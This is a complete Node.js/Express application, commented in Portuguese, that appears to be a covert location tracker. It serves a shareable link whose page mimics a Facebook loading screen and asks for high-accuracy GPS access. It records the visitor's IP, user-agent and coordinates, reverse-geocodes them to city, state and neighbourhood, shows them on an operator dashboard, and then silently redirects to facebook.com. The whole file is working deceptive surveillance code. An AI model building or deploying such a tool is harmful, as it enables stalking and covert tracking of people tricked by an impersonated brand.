const express = require('express');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());

const clicks = [];

// Função para requisições HTTP/HTTPS
function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    lib.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data));
        } catch (e) {
          reject(e);
        }
      });
    }).on('error', reject);
  });
}

// Captura IP real
function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
}

// Dashboard principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard GPS</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 10px; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 10px 15px;
          border-radius: 5px;
          display: block;
          margin: 10px 0;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 10px 25px;
          border-radius: 20px;
          cursor: pointer;
          font-size: 0.95em;
          margin-top: 10px;
        }
        .btn:hover { background: #5568d3; }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #667eea;
          padding: 20px;
          margin-bottom: 15px;
          border-radius: 8px;
        }
        .click-item.has-gps {
          border-left-color: #28a745;
          background: #f0fff4;
        }
        .click-item.no-gps {
          border-left-color: #ffc107;
          background: #fff9e6;
        }
        .click-time { 
          font-weight: bold; 
          color: #667eea; 
          font-size: 1.1em; 
          margin-bottom: 12px; 
        }
        .click-info { 
          color: #555; 
          margin: 8px 0; 
          line-height: 1.8; 
          font-size: 0.95em;
        }
        .badge {
          display: inline-block;
          padding: 6px 14px;
          border-radius: 15px;
          font-size: 0.85em;
          font-weight: bold;
          margin: 10px 0;
        }
        .badge-success { background: #28a745; color: white; }
        .badge-warning { background: #ffc107; color: #333; }
        .map-link {
          color: #667eea;
          text-decoration: none;
          font-weight: bold;
        }
        .map-link:hover { text-decoration: underline; }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📍 Rastreador GPS</h1>
          <p>Captura localização precisa via GPS</p>
          <div class="link-box">
            <strong>🔗 Link de Rastreamento:</strong>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()">📋 Copiar Link</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="noGpsClicks">0</div>
            <div class="stat-label">Sem GPS</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <h2 style="margin:20px 0;">📋 Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('✅ Link copiado!');
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.location);
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            
            const noGpsClicks = data.clicks.filter(c => !c.location);
            document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
            
            const container = document.getElementById('clicksList');
            
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center; color:#999; padding:40px;">📭 Nenhum clique ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
              });
              
              const hasGPS = c.location && c.location.cidade;
              const itemClass = hasGPS ? 'click-item has-gps' : 'click-item no-gps';
              
              let content = '';
              if (hasGPS) {
                const loc = c.location;
                content = \`
                  <div class="badge badge-success">✅ GPS ATIVADO</div>
                  <div class="click-info">🏙️ <strong>Cidade:</strong> \${loc.cidade}</div>
                  <div class="click-info">📍 <strong>Estado:</strong> \${loc.estado}</div>
                  \${loc.bairro && loc.bairro !== 'N/A' ? \`
                    <div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>
                  \` : ''}
                  \${loc.coordenadas ? \`
                    <div class="click-info">
                      <a href="https://www.google.com/maps?q=\${loc.coordenadas}" target="_blank" class="map-link">
                        🗺️ Ver localização exata no Google Maps
                      </a>
                    </div>
                  \` : ''}
                \`;
              } else {
                content = \`
                  <div class="badge badge-warning">⚠️ GPS DESLIGADO/NEGADO</div>
                  <div class="click-info" style="color:#856404;">
                    Usuário não permitiu acesso à localização
                  </div>
                \`;
              }
              
              return \`
                <div class="\${itemClass}">
                  <div class="click-time">⏰ \${date}</div>
                  \${content}
                </div>
              \`;
            }).join('');
          } catch (error) {
            console.error('Erro:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento (pede GPS)
app.get('/track', async (req, res) => {
  const ip = getIP(req);
  const userAgent = req.headers['user-agent'] || 'Desconhecido';
  
  const clickData = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    ip: ip,
    userAgent: userAgent,
    location: null
  };
  
  clicks.push(clickData);
  
  console.log('');
  console.log('🎯 NOVO CLIQUE');
  console.log('Hora:', new Date().toLocaleString('pt-BR'));
  
  res.send(`
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Carregando...</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: #1877f2;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        .container {
          text-align: center;
          color: white;
          padding: 20px;
        }
        .logo {
          font-size: 80px;
          font-weight: bold;
          margin-bottom: 20px;
        }
        h2 {
          font-size: 20px;
          font-weight: 400;
          margin-bottom: 15px;
        }
        .message {
          font-size: 14px;
          opacity: 0.9;
          margin-bottom: 30px;
        }
        .loader {
          border: 4px solid rgba(255,255,255,0.3);
          border-top: 4px solid white;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 0.8s linear infinite;
          margin: 0 auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .warning {
          background: rgba(255,255,255,0.1);
          padding: 15px;
          border-radius: 10px;
          margin-top: 20px;
          font-size: 13px;
          max-width: 300px;
          margin-left: auto;
          margin-right: auto;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="logo">f</div>
        <h2 id="status">Verificando localização...</h2>
        <div class="message" id="message">Aguarde um momento</div>
        <div class="loader"></div>
        <div class="warning" id="warning" style="display:none;">
          ⚠️ Por favor, permita o acesso à sua localização para continuar
        </div>
      </div>
      
      <script>
        const clickId = ${clickData.id};
        let redirected = false;
        
        function updateStatus(title, msg) {
          document.getElementById('status').textContent = title;
          document.getElementById('message').textContent = msg;
        }
        
        function redirect() {
          if (!redirected) {
            redirected = true;
            updateStatus('Redirecionando...', 'Aguarde');
            setTimeout(() => {
              window.location.href = 'https://www.facebook.com/';
            }, 500);
          }
        }
        
        // Verifica se o navegador suporta GPS
        if (!navigator.geolocation) {
          updateStatus('GPS não suportado', 'Redirecionando...');
          setTimeout(redirect, 2000);
        } else {
          updateStatus('Solicitando localização...', 'Por favor, permita o acesso');
          document.getElementById('warning').style.display = 'block';
          
          // Pede GPS com timeout de 15 segundos
          const timeout = setTimeout(() => {
            if (!redirected) {
              console.log('Timeout GPS - redirecionando');
              updateStatus('Tempo esgotado', 'Redirecionando...');
              redirect();
            }
          }, 15000);
          
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              clearTimeout(timeout);
              
              const lat = position.coords.latitude;
              const lng = position.coords.longitude;
              
              console.log('✅ GPS obtido:', lat, lng);
              updateStatus('Localização obtida!', 'Processando...');
              document.getElementById('warning').style.display = 'none';
              
              try {
                await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: {'Content-Type': 'application/json'},
                  body: JSON.stringify({
                    clickId: clickId,
                    lat: lat,
                    lng: lng,
                    accuracy: position.coords.accuracy
                  })
                });
                
                console.log('GPS salvo com sucesso');
              } catch (error) {
                console.error('Erro ao salvar GPS:', error);
              }
              
              redirect();
            },
            (error) => {
              clearTimeout(timeout);
              
              console.log('❌ GPS negado ou erro:', error.message);
              
              let errorMsg = 'GPS não disponível';
              if (error.code === 1) {
                errorMsg = 'Permissão negada';
              } else if (error.code === 2) {
                errorMsg = 'Localização indisponível';
              } else if (error.code === 3) {
                errorMsg = 'Tempo esgotado';
              }
              
              updateStatus(errorMsg, 'Redirecionando...');
              
              // Registra que GPS foi negado
              fetch('/api/save-gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                  clickId: clickId,
                  error: errorMsg
                })
              }).catch(() => {});
              
              setTimeout(redirect, 2000);
            },
            {
              enableHighAccuracy: true,
              timeout: 12000,
              maximumAge: 0
            }
          );
        }
      </script>
    </body>
    </html>
  `);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy, error } = req.body;
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      return res.json({ success: false });
    }
    
    if (error) {
      console.log('  ❌ GPS:', error);
      return res.json({ success: true });
    }
    
    if (!lat || !lng) {
      return res.json({ success: false });
    }
    
    console.log('  📍 GPS:', lat, lng, '(±', accuracy, 'm)');
    
    // Busca endereço via Nominatim (OpenStreetMap)
    try {
      const data = await fetchJSON(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1&accept-language=pt-BR`
      );
      
      if (data && data.address) {
        const addr = data.address;
        
        click.location = {
          cidade: addr.city || addr.town || addr.village || addr.municipality || 'Não identificada',
          estado: addr.state || 'Não identificado',
          bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || 'N/A',
          pais: addr.country || 'Brasil',
          coordenadas: `${lat}, ${lng}`
        };
        
        console.log('  ✅ Localização:', click.location.cidade, '-', click.location.estado);
        if (click.location.bairro !== 'N/A') {
          console.log('     Bairro:', click.location.bairro);
        }
      }
    } catch (error) {
      console.error('  ✗ Erro ao buscar endereço:', error.message);
      click.location = {
        cidade: 'Erro ao buscar',
        estado: 'Erro',
        coordenadas: `${lat}, ${lng}`
      };
    }
    
    res.json({ success: true });
  } catch (error) {
    console.error('Erro:', error);
    res.json({ success: false });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: clicks.slice().reverse()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK',
    uptime: process.uptime(),
    clicks: clicks.length
  });
});

// Inicia o servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('========================================');
  console.log('✅ RASTREADOR GPS ONLINE');
  console.log('========================================');
  console.log('🌐 Porta:', PORT);
  console.log('📍 Modo: GPS (solicita permissão)');
  console.log('🔗 Redirect: Facebook');
  console.log('========================================');
  console.log('');
});
